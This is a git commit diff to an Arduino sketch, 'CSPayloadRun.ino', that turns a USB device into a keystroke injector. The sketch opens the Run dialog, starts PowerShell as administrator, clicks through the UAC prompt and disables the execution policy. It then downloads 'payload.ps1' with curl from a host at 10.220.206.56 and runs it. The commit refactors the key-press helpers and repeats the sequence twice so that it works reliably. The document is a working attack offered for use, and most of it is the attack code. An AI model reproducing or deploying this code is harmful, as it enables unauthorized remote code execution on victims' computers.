bb360897dba77ab99afac160dfd48a81070dda0d
Recogerous <2737936634@qq.com>
2024-08-05 15:08:52 +0800

    encapsulate and ensure process running
    - Encapsulate press key and delay.
    - Run the main part twice to ensure the process is running.

--- CSPayloadRun/CSPayloadRun.ino
+++ CSPayloadRun/CSPayloadRun.ino
@@ -1,38 +1,51 @@
 #include <Keyboard.h>
 
-void sendCmd(const char* sequence) {  // 输入并回车
+// 输入一行命令，自带回车
+void sendCmd(const char* sequence) {
   Keyboard.println(sequence);
   delay(500);
 }
 
-void switchCapsLock() {  // 切换Caps Lock
-  Keyboard.press(KEY_CAPS_LOCK);
-  delay(200);
+// 按下一个键，然后释放，指定按住的时间、释放后延时的时间
+void pressKey(int key, int pressTime = 0, int afterReleaseTime = 200) {
+  Keyboard.press(key);
+  delay(pressTime);
   Keyboard.releaseAll();
-  delay(200);
+  delay(afterReleaseTime);
 }
 
-void setup() {
-  Keyboard.begin();
-  delay(1000);
-
-  // 打开运行对话框
-  Keyboard.press(KEY_LEFT_GUI);
-  delay(200);
-  Keyboard.press('r');
-  delay(200);
+// 同时按下多个键，然后释放，指定按住的时间、释放后延时的时间
+void pressKeys(int* keys, int size, int pressTime = 0, int afterReleaseTime = 200) {
+  for (int i = 0; i < size; i++) {
+    Keyboard.press(keys[i]);
+    delay(pressTime);
+  }
   Keyboard.releaseAll();
-  delay(1000);
+  delay(afterReleaseTime);
+}
+
+// 切换Caps Lock
+void switchCapsLock() {
+  pressKey(KEY_CAPS_LOCK, 200, 200);
+}
+
+// 主过程
+void main_process() {
+  // 打开运行对话框
+  int keyList[] = {KEY_LEFT_GUI, 'r'};
+  pressKeys(keyList, 2, 0, 1000);
   
-  // 打开PowerShell，Ctrl + Shift + Enter以管理员身份运行PowerShell
-  switchCapsLock();  // 打开 Caps Lock
+  // 输入PowerShell
   Keyboard.print("powershell");  // println会多输入一个换行符
   delay(500);
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(2000);
+
+  // Ctrl + Shift + Enter以管理员身份运行PowerShell
+  int keyList2[] = {KEY_LEFT_CTRL, KEY_LEFT_SHIFT, KEY_RETURN};
+  pressKeys(keyList2, 3, 0, 2000);
+
+  // 确认用户账户控制通知，如果被关闭，下面的代码也不会起作用
+  pressKey(KEY_LEFT_ARROW, 0, 200);  // 按下左键
+  pressKey(KEY_RETURN, 0, 2000);  // 按下回车
 
   // 执行命令
   sendCmd("set-executionpolicy unrestricted");  // 更改执行策略
@@ -41,8 +54,25 @@ void setup() {
   sendCmd("mkdir d:/test");  // 在D盘下创建test文件夹
   sendCmd("curl -o d:/test/ciallo.ps1 10.220.206.56:8000/payload.ps1");  // 下载文件
   sendCmd("d:/test/ciallo.ps1");  // 执行文件
+}
 
-  switchCapsLock();  // 关闭 Caps Lock
+
+void setup() {
+  Keyboard.begin();
+  delay(1000);
+
+  // 如果一开始 Caps Lock 就是关闭的，那么第一次执行主过程时会失败
+  // 接下来再执行一遍，就能确保正常执行
+  for (int i = 0; i < 2; i++) {
+    switchCapsLock();
+    main_process();
+    // 为了确保执行成功，还需敲2下回车
+    for (int j = 0; j < 2; j++)
+    {
+      pressKey(KEY_RETURN, 0, 200);
+    }
+  }
+
   Keyboard.end();
 }
 
